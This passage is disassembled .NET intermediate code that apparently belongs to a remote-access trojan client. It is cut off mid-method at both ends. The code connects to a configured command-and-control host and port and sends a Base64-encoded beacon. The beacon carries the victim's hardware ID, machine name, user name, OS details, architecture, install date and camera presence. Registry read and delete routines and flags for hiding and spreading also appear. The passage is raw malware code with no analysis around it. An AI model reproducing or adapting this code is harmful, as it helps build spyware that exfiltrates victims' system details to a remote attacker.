        IL_0094:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
        IL_0099:  ldc.i4     0x32000
        IL_009e:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_00a3:  ldarg.0
        IL_00a4:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
        IL_00a9:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00ae:  ldc.i4     0x2710
        IL_00b3:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_00b8:  ldarg.0
        IL_00b9:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
        IL_00be:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00c3:  ldc.i4     0x2710
        IL_00c8:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_00cd:  ldarg.0
        IL_00ce:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
        IL_00d3:  ldarg.0
        IL_00d4:  ldfld      string k.OK::H
        IL_00d9:  ldarg.0
        IL_00da:  ldfld      string k.OK::P
        IL_00df:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_00e4:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_00e9:  ldarg.0
        IL_00ea:  ldc.i4.1
        IL_00eb:  stfld      bool k.OK::Cn
        IL_00f0:  ldarg.0
        IL_00f1:  ldarg.0
        IL_00f2:  callvirt   instance string k.OK::inf()
        IL_00f7:  callvirt   instance bool k.OK::Send(string)
        IL_00fc:  pop
        .try
        {
          IL_00fd:  ldstr      ""
          IL_0102:  stloc.2
          IL_0103:  ldarg.0
          IL_0104:  ldstr      "vn"
          IL_0109:  ldstr      ""
          IL_010e:  callvirt   instance object k.OK::GTV(string,
                                                         object)
          IL_0113:  ldstr      ""
          IL_0118:  ldc.i4.0
          IL_0119:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_011e:  brfalse.s  IL_013a

          IL_0120:  ldloc.2
          IL_0121:  ldarg.0
          IL_0122:  ldarg.0
          IL_0123:  ldflda     string k.OK::VN
          IL_0128:  callvirt   instance string k.OK::DEB(string&)
          IL_012d:  ldstr      ","
          IL_0132:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0137:  stloc.2
          IL_0138:  br.s       IL_0165

          IL_013a:  ldloc.2
          IL_013b:  ldarg.0
          IL_013c:  ldarg.0
          IL_013d:  ldstr      "vn"
          IL_0142:  ldstr      ""
          IL_0147:  callvirt   instance object k.OK::GTV(string,
                                                         object)
          IL_014c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_0151:  stloc.s    V_4
          IL_0153:  ldloca.s   V_4
          IL_0155:  callvirt   instance string k.OK::DEB(string&)
          IL_015a:  ldstr      ","
          IL_015f:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0164:  stloc.2
          IL_0165:  ldc.i4.5
          IL_0166:  newarr     [mscorlib]System.String
          IL_016b:  stloc.s    V_5
          IL_016d:  ldloc.s    V_5
          IL_016f:  ldc.i4.0
          IL_0170:  ldloc.2
          IL_0171:  stelem.ref
          IL_0172:  ldloc.s    V_5
          IL_0174:  ldc.i4.1
          IL_0175:  ldarg.0
          IL_0176:  ldfld      string k.OK::H
          IL_017b:  stelem.ref
          IL_017c:  ldloc.s    V_5
          IL_017e:  ldc.i4.2
          IL_017f:  ldstr      ":"
          IL_0184:  stelem.ref
          IL_0185:  ldloc.s    V_5
          IL_0187:  ldc.i4.3
          IL_0188:  ldarg.0
          IL_0189:  ldfld      string k.OK::P
          IL_018e:  stelem.ref
          IL_018f:  ldloc.s    V_5
          IL_0191:  ldc.i4.4
          IL_0192:  ldstr      ","
          IL_0197:  stelem.ref
          IL_0198:  ldloc.s    V_5
          IL_019a:  call       string [mscorlib]System.String::Concat(string[])
          IL_019f:  stloc.2
          IL_01a0:  ldloc.2
          IL_01a1:  ldarg.0
          IL_01a2:  ldfld      string k.OK::DR
          IL_01a7:  ldstr      ","
          IL_01ac:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01b1:  stloc.2
          IL_01b2:  ldloc.2
          IL_01b3:  ldarg.0
          IL_01b4:  ldfld      string k.OK::EXE
          IL_01b9:  ldstr      ","
          IL_01be:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01c3:  stloc.2
          IL_01c4:  ldloc.2
          IL_01c5:  ldarg.0
          IL_01c6:  ldfld      bool k.OK::Idr
          IL_01cb:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01d0:  ldstr      ","
          IL_01d5:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01da:  stloc.2
          IL_01db:  ldloc.2
          IL_01dc:  ldarg.0
          IL_01dd:  ldfld      bool k.OK::IsF
          IL_01e2:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01e7:  ldstr      ","
          IL_01ec:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01f1:  stloc.2
          IL_01f2:  ldloc.2
          IL_01f3:  ldarg.0
          IL_01f4:  ldfld      bool k.OK::Isu
          IL_01f9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01fe:  ldstr      ","
          IL_0203:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0208:  stloc.2
          IL_0209:  ldloc.2
          IL_020a:  ldarg.0
          IL_020b:  ldfld      bool k.OK::BD
          IL_0210:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0215:  ldstr      ","
          IL_021a:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_021f:  stloc.2
          IL_0220:  ldloc.2
          IL_0221:  ldarg.0
          IL_0222:  ldfld      bool k.OK::Hid
          IL_0227:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_022c:  ldstr      ","
          IL_0231:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0236:  stloc.2
          IL_0237:  ldloc.2
          IL_0238:  ldarg.0
          IL_0239:  ldfld      bool k.OK::Spr
          IL_023e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0243:  ldstr      ","
          IL_0248:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_024d:  stloc.2
          IL_024e:  ldarg.0
          IL_024f:  ldstr      "infn"
          IL_0254:  ldarg.0
          IL_0255:  ldfld      string k.OK::Y
          IL_025a:  ldarg.0
          IL_025b:  ldloca.s   V_2
          IL_025d:  callvirt   instance string k.OK::ENB(string&)
          IL_0262:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0267:  callvirt   instance bool k.OK::Send(string)
          IL_026c:  pop
          IL_026d:  leave.s    IL_0295

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_026f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0274:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0279:  leave.s    IL_0295

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_027b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0280:  ldarg.0
        IL_0281:  ldc.i4.0
        IL_0282:  stfld      bool k.OK::Cn
        IL_0287:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_028c:  leave.s    IL_0295

      }  // end handler
    }  // end .try
    finally
    {
      IL_028e:  ldloc.3
      IL_028f:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0294:  endfinally
    }  // end handler
    IL_0295:  ldarg.0
    IL_0296:  ldfld      bool k.OK::Cn
    IL_029b:  ret
  } // end of method OK::connect

  .method public instance string  DEB(string& s) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  2
    .locals init (string V_0,
             uint8[] V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldind.ref
    IL_0003:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0008:  stloc.1
    IL_0009:  ldloca.s   V_1
    IL_000b:  callvirt   instance string k.OK::BS(uint8[]&)
    IL_0010:  ret
  } // end of method OK::DEB

  .method public instance string  ENB(string& s) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  callvirt   instance uint8[] k.OK::SB(string&)
    IL_0007:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_000c:  ret
  } // end of method OK::ENB

  .method public instance object  GTV(string n,
                                      object 'ret') cil managed
  {
    // Code size       78 (0x4e)
    .maxstack  3
    .locals init (object V_0,
             object V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_0006:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0010:  ldstr      "software\\"
      IL_0015:  ldarg.0
      IL_0016:  ldfld      string k.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0025:  ldarg.1
      IL_0026:  ldarg.2
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_0031:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0036:  stloc.1
      IL_0037:  leave.s    IL_004c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003e:  ldarg.2
      IL_003f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0044:  stloc.1
      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004a:  leave.s    IL_004c

    }  // end handler
    IL_004c:  ldloc.1
    IL_004d:  ret
  } // end of method OK::GTV

  .method public instance string  HWD() cil managed
  {
    // Code size       82 (0x52)
    .maxstack  8
    .locals init (string V_0,
             string V_1,
             int32 V_2,
             string V_3,
             string V_4,
             int32 V_5,
             int32 V_6,
             string V_7)
    .try
    {
      IL_0000:  ldstr      "systemDrive"
      IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_000a:  ldstr      "\\"
      IL_000f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0014:  stloc.3
      IL_0015:  ldloca.s   V_3
      IL_0017:  ldnull
      IL_0018:  stloc.s    V_4
      IL_001a:  ldloca.s   V_4
      IL_001c:  ldc.i4.0
      IL_001d:  ldloca.s   V_2
      IL_001f:  ldc.i4.0
      IL_0020:  stloc.s    V_5
      IL_0022:  ldloca.s   V_5
      IL_0024:  ldc.i4.0
      IL_0025:  stloc.s    V_6
      IL_0027:  ldloca.s   V_6
      IL_0029:  ldnull
      IL_002a:  stloc.s    V_7
      IL_002c:  ldloca.s   V_7
      IL_002e:  ldc.i4.0
      IL_002f:  call       int32 k.OK::GetVolumeInformation(string&,
                                                            string&,
                                                            int32,
                                                            int32&,
                                                            int32&,
                                                            int32&,
                                                            string&,
                                                            int32)
      IL_0034:  pop
      IL_0035:  ldloc.2
      IL_0036:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003b:  stloc.1
      IL_003c:  leave.s    IL_0050

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  ldstr      "ERR"
      IL_0048:  stloc.1
      IL_0049:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004e:  leave.s    IL_0050

    }  // end handler
    IL_0050:  ldloc.1
    IL_0051:  ret
  } // end of method OK::HWD

  .method public instance void  DLV(string n) cil managed
  {
    // Code size       48 (0x30)
    .maxstack  3
    .try
    {
      IL_0000:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0005:  ldstr      "software\\"
      IL_000a:  ldarg.0
      IL_000b:  ldfld      string k.OK::RG
      IL_0010:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0015:  ldc.i4.1
      IL_0016:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_001b:  ldarg.1
      IL_001c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_0021:  leave.s    IL_002f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0028:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002d:  leave.s    IL_002f

    }  // end handler
    IL_002f:  ret
  } // end of method OK::DLV

  .method public instance void  ED() cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.0
    IL_0002:  callvirt   instance void k.OK::pr(int32)
    IL_0007:  ret
  } // end of method OK::ED

  .method public instance string  inf() cil managed
  {
    // Code size       1039 (0x40f)
    .maxstack  6
    .locals init (string V_0,
             string V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string[] V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             string V_11,
             string V_12,
             string V_13,
             valuetype [mscorlib]System.DateTime V_14,
             valuetype [mscorlib]System.DateTime V_15,
             string[] V_16,
             int32 V_17,
             string[] V_18)
    IL_0000:  ldstr      "li"
    IL_0005:  ldarg.0
    IL_0006:  ldfld      string k.OK::Y
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0010:  stloc.1
    .try
    {
      IL_0011:  ldarg.0
      IL_0012:  ldstr      "vn"
      IL_0017:  ldstr      ""
      IL_001c:  callvirt   instance object k.OK::GTV(string,
                                                     object)
      IL_0021:  ldstr      ""
      IL_0026:  ldc.i4.0
      IL_0027:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002c:  brfalse.s  IL_0063

      IL_002e:  ldloc.1
      IL_002f:  ldarg.0
      IL_0030:  ldarg.0
      IL_0031:  ldarg.0
      IL_0032:  ldflda     string k.OK::VN
      IL_0037:  callvirt   instance string k.OK::DEB(string&)
      IL_003c:  ldstr      "_"
      IL_0041:  ldarg.0
      IL_0042:  callvirt   instance string k.OK::HWD()
      IL_0047:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004c:  stloc.s    V_12
      IL_004e:  ldloca.s   V_12
      IL_0050:  callvirt   instance string k.OK::ENB(string&)
      IL_0055:  ldarg.0
      IL_0056:  ldfld      string k.OK::Y
      IL_005b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0060:  stloc.1
      IL_0061:  leave.s    IL_00d6

      IL_0063:  ldloc.1
      IL_0064:  ldarg.0
      IL_0065:  ldarg.0
      IL_0066:  ldarg.0
      IL_0067:  ldstr      "vn"
      IL_006c:  ldstr      ""
      IL_0071:  callvirt   instance object k.OK::GTV(string,
                                                     object)
      IL_0076:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_007b:  stloc.s    V_12
      IL_007d:  ldloca.s   V_12
      IL_007f:  callvirt   instance string k.OK::DEB(string&)
      IL_0084:  ldstr      "_"
      IL_0089:  ldarg.0
      IL_008a:  callvirt   instance string k.OK::HWD()
      IL_008f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0094:  stloc.s    V_13
      IL_0096:  ldloca.s   V_13
      IL_0098:  callvirt   instance string k.OK::ENB(string&)
      IL_009d:  ldarg.0
      IL_009e:  ldfld      string k.OK::Y
      IL_00a3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a8:  stloc.1
      IL_00a9:  leave.s    IL_00d6

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ab:  dup
      IL_00ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b1:  stloc.3
      IL_00b2:  ldloc.1
      IL_00b3:  ldarg.0
      IL_00b4:  ldarg.0
      IL_00b5:  callvirt   instance string k.OK::HWD()
      IL_00ba:  stloc.s    V_13
      IL_00bc:  ldloca.s   V_13
      IL_00be:  callvirt   instance string k.OK::ENB(string&)
      IL_00c3:  ldarg.0
      IL_00c4:  ldfld      string k.OK::Y
      IL_00c9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ce:  stloc.1
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d4:  leave.s    IL_00d6

    }  // end handler
    .try
    {
      IL_00d6:  ldloc.1
      IL_00d7:  ldarg.0
      IL_00d8:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00dd:  stloc.s    V_13
      IL_00df:  ldloca.s   V_13
      IL_00e1:  callvirt   instance string k.OK::ENB(string&)
      IL_00e6:  ldarg.0
      IL_00e7:  ldfld      string k.OK::Y
      IL_00ec:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00f1:  stloc.1
      IL_00f2:  leave.s    IL_011f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00f4:  dup
      IL_00f5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00fa:  stloc.s    V_4
      IL_00fc:  ldloc.1
      IL_00fd:  ldarg.0
      IL_00fe:  ldstr      "\?\?"
      IL_0103:  stloc.s    V_13
      IL_0105:  ldloca.s   V_13
      IL_0107:  callvirt   instance string k.OK::ENB(string&)
      IL_010c:  ldarg.0
      IL_010d:  ldfld      string k.OK::Y
      IL_0112:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0117:  stloc.1
      IL_0118:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011d:  leave.s    IL_011f

    }  // end handler
    .try
    {
      IL_011f:  ldloc.1
      IL_0120:  ldarg.0
      IL_0121:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0126:  stloc.s    V_13
      IL_0128:  ldloca.s   V_13
      IL_012a:  callvirt   instance string k.OK::ENB(string&)
      IL_012f:  ldarg.0
      IL_0130:  ldfld      string k.OK::Y
      IL_0135:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_013a:  stloc.1
      IL_013b:  leave.s    IL_0168

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_013d:  dup
      IL_013e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0143:  stloc.s    V_5
      IL_0145:  ldloc.1
      IL_0146:  ldarg.0
      IL_0147:  ldstr      "\?\?"
      IL_014c:  stloc.s    V_13
      IL_014e:  ldloca.s   V_13
      IL_0150:  callvirt   instance string k.OK::ENB(string&)
      IL_0155:  ldarg.0
      IL_0156:  ldfld      string k.OK::Y
      IL_015b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0160:  stloc.1
      IL_0161:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0166:  leave.s    IL_0168

    }  // end handler
    .try
    {
      IL_0168:  ldloc.1
      IL_0169:  ldarg.0
      IL_016a:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_016f:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0174:  stloc.s    V_14
      IL_0176:  ldloca.s   V_14
      IL_0178:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_017d:  stloc.s    V_15
      IL_017f:  ldloca.s   V_15
      IL_0181:  ldstr      "yy-MM-dd"
      IL_0186:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_018b:  ldarg.0
      IL_018c:  ldfld      string k.OK::Y
      IL_0191:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0196:  stloc.1
      IL_0197:  leave.s    IL_01ba

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0199:  dup
      IL_019a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_019f:  stloc.s    V_6
      IL_01a1:  ldloc.1
      IL_01a2:  ldstr      "\?\?-\?\?-\?\?"
      IL_01a7:  ldarg.0
      IL_01a8:  ldfld      string k.OK::Y
      IL_01ad:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01b2:  stloc.1
      IL_01b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b8:  leave.s    IL_01ba

    }  // end handler
    IL_01ba:  ldloc.1
    IL_01bb:  ldstr      ""
    IL_01c0:  ldarg.0
    IL_01c1:  ldfld      string k.OK::Y
    IL_01c6:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_01cb:  stloc.1
    .try
    {
      IL_01cc:  ldloc.1
      IL_01cd:  ldarg.0
      IL_01ce:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_01d3:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01d8:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01dd:  ldstr      "Microsoft"
      IL_01e2:  ldstr      ""
      IL_01e7:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ec:  ldstr      "Windows"
      IL_01f1:  ldstr      "Win"
      IL_01f6:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01fb:  ldstr      bytearray (AE 00 ) 
      IL_0200:  ldstr      ""
      IL_0205:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_020a:  ldstr      bytearray (22 21 )                                           // "!
      IL_020f:  ldstr      ""
      IL_0214:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0219:  ldstr      "  "
      IL_021e:  ldstr      " "
      IL_0223:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0228:  ldstr      " Win"
      IL_022d:  ldstr      "Win"
      IL_0232:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0237:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_023c:  stloc.1
      IL_023d:  leave.s    IL_025a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_023f:  dup
      IL_0240:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0245:  stloc.s    V_7
      IL_0247:  ldloc.1
      IL_0248:  ldstr      "\?\?"
      IL_024d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0252:  stloc.1
      IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0258:  leave.s    IL_025a

    }  // end handler
    IL_025a:  ldloc.1
    IL_025b:  ldstr      "SP"
    IL_0260:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0265:  stloc.1
    .try
    {
      IL_0266:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_026b:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0270:  ldstr      " "
      IL_0275:  ldc.i4.m1
      IL_0276:  ldc.i4.0
      IL_0277:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_027c:  stloc.s    V_8
      IL_027e:  ldloc.s    V_8
      IL_0280:  ldlen
      IL_0281:  conv.ovf.i4
      IL_0282:  ldc.i4.1
      IL_0283:  bne.un.s   IL_0291

      IL_0285:  ldloc.1
      IL_0286:  ldstr      "0"
      IL_028b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0290:  stloc.1
      IL_0291:  ldloc.1
      IL_0292:  ldloc.s    V_8
      IL_0294:  ldloc.s    V_8
      IL_0296:  ldlen
      IL_0297:  conv.ovf.i4
      IL_0298:  ldc.i4.1
      IL_0299:  sub.ovf
      IL_029a:  ldelem.ref
      IL_029b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02a0:  stloc.1
      IL_02a1:  leave.s    IL_02be

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02a3:  dup
      IL_02a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02a9:  stloc.s    V_9
      IL_02ab:  ldloc.1
      IL_02ac:  ldstr      "0"
      IL_02b1:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02b6:  stloc.1
      IL_02b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02bc:  leave.s    IL_02be

    }  // end handler
    .try
    {
      IL_02be:  ldc.i4.s   38
      IL_02c0:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02c5:  ldstr      "x86"
      IL_02ca:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02cf:  brfalse.s  IL_02e5

      IL_02d1:  ldloc.1
      IL_02d2:  ldstr      " x64"
      IL_02d7:  ldarg.0
      IL_02d8:  ldfld      string k.OK::Y
      IL_02dd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02e2:  stloc.1
      IL_02e3:  leave.s    IL_0315

      IL_02e5:  ldloc.1
      IL_02e6:  ldstr      " x86"
      IL_02eb:  ldarg.0
      IL_02ec:  ldfld      string k.OK::Y
      IL_02f1:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02f6:  stloc.1
      IL_02f7:  leave.s    IL_0315

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02f9:  dup
      IL_02fa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02ff:  stloc.s    V_10
      IL_0301:  ldloc.1
      IL_0302:  ldarg.0
      IL_0303:  ldfld      string k.OK::Y
      IL_0308:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_030d:  stloc.1
      IL_030e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0313:  leave.s    IL_0315

    }  // end handler
    IL_0315:  ldarg.0
    IL_0316:  callvirt   instance bool k.OK::Cam()
    IL_031b:  brfalse.s  IL_0331

    IL_031d:  ldloc.1
    IL_031e:  ldstr      "Yes"
    IL_0323:  ldarg.0
